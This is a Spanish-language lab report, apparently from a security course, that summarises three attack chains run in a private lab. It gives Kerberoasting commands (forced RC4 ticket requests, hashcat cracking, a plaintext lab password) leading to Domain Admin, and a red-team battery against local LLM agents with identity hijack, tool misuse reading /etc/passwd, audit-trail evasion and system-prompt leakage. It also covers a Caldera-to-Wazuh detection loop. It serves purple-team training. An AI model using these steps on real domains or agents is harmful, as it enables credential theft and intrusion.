# Attack Chains Validadas — Lab TARS (2026-08-19)

> Cadenas de ataque completas, ejecutadas y verificadas en el lab propio.
> Cada cadena tiene evidencia reproducible en `evidence/` y `reports/`.
> Nivel 1 del curso: arquitectura Wazuh + attack chains + findings prompt injection.

---

## Chain 1 — AD Kerberoast → Domain Admin (COMPLETA)

**Objetivo:** comprometer el dominio `TARS.LOCAL` (Samba AD, VM `dc1`) desde
el atacante interno (Kali VM).

```
kinit tarsadmin
  → kvno -e 23 (RC4 forzado) → ccache
  → hashcat -m 13100 kerberoast.txt rockyou.txt
  → 4/4 hashes $krb5tgs$23$ crackeados
    (svc_sql, svc_backup, deleg_svc, svc_web)
  → svc_sql = Domain Admins → COMPROMISO TOTAL DA
```

**Resultado:** 4/4 hashes Kerberoast crackeados; `svc_sql` en Domain Admins
→ compromiso total del dominio.

**Misconfigs explotadas:**
- SPNs con passwords débiles (crackeables con rockyou)
- `svc_sql` miembro de Domain Admins (privilegio excesivo)
- Unconstrained delegation (`deleg_svc`)

**Evidencia:**
- `evidence/ad-suite-real-20260809/` — 01-spn-enum, 03-asrep, 04-kerb-crack, 05-secretsdump-full, 09f-gpo-verify
- `reports/ad-lab-REPORTE.md`

**MITRE ATT&CK:** T1558.003 (Kerberoasting) — score 100 en la layer de cobertura.

---

## Chain 2 — Agentic AI Red Team (OWASP ASI 2026)

**Objetivo:** evaluar la seguridad de agentes LLM locales contra el estándar
OWASP Agentic AI Top 10 2026 (ASI01-ASI10).

```
24 ataques × 2 modelos (ASI01-ASI10)
  → clasificador determinista (temp=0, 2 runs byte-idénticos)
  → qwen3:8b: F1 identity hijack (responde "HACKED"),
    F2 tool misuse (read /etc/passwd),
    F3 audit trail evasion,
    F4 system prompt leakage verbatim
  → ornith:9b: resiste jailbreaks directos; filtra configuración estructurada
```

**Resultado:** qwen3:8b significativamente más vulnerable que ornith:9b.
Severidad global ALTA — un agente basado en qwen3:8b sin capa de seguridad
externa es comprometible por un atacante con acceso al prompt.

**Evidencia:**
- `evidence/REPORT-MASTER-TARS-FLEET-2026-08-09.md`
- `evidence/2026-08-08-*/` (agentic-owasp-field-test, ornith9b-multi-turn, redteam-qwen3-vs-ornith)
- `reports/ATLAS-MAPPING-AI-RED-TEAM-2026-08-09.md`

---

## Chain 3 — Purple loop (Caldera → Wazuh)

**Objetivo:** emular MITRE ATT&CK con cobertura medible en Wazuh — el lab
mide su propia detección.

```
Caldera op Discovery (sandcat ceewjl, host fedora)
  → 6 técnicas ejecutadas
  → Wazuh detecta 1 (T1057 vía regla 100601)
  → cobertura medible 1/6
```

**Flujo visual:** `evidence/attack-flow-purple-discovery.json`
sandcat (T1105) → whoami (T1033) → cat /etc/passwd (T1033) → ps aux (T1057)
→ **DETECTADO por Wazuh 100601**.

**Evidencia:**
- `evidence/mission-control-2026-08-09.md`
- `evidence/attack-flow-purple-discovery.json`
- `evidence/attack-navigator-layer.json`
- `ops/purple-loop.sh` (automatización semanal)

---

## Resumen de cobertura (ATT&CK Navigator)

| Técnica | Táctica | Score | Estado |
|---------|---------|-------|--------|
| T1057 Process Discovery | discovery | 100 | Detectado |
| T1558.003 Kerberoasting | credential-access | 100 | Detectado |
| T1558.004 AS-REP Roasting | credential-access | 100 | Documentado |
| T1558.001 Golden Ticket | credential-access | 100 | Documentado |
| T1033 User Discovery | discovery | 50 | Parcial |
| T1098 Account Manipulation | persistence | 50 | Pendiente |
| T1078 Valid Accounts | defense-evasion | 50 | Parcial |
| T1059 Command Interpreter | execution | 50 | Parcial |
| T1190 Exploit Public-Facing | initial-access | 50 | Labs web |
| T1003.001 LSASS Memory | credential-access | 0 | Gap |
| T1003.003 NTDS | credential-access | 0 | Gap |
| T1110 Brute Force | credential-access | 0 | Gap |

---

## Cómo replicar (reproducible)

```bash
# Chain 1 — Kerberoast
kinit tarsadmin  # TarsLab2026!
kvno -e 23 MSSQLSvc/dc01.tars.local:1433
# parsear ccache → hashcat -m 13100 kerberoast.txt rockyou.txt

# Chain 2 — Batería agentic (GEEKOM)
bash /tmp/battery-2026-08-10.sh   # 8 casos × 2 modelos → JSON

# Chain 3 — Purple loop semanal
bash ops/purple-loop.sh           # Caldera op → Wazuh cobertura → evidence
```
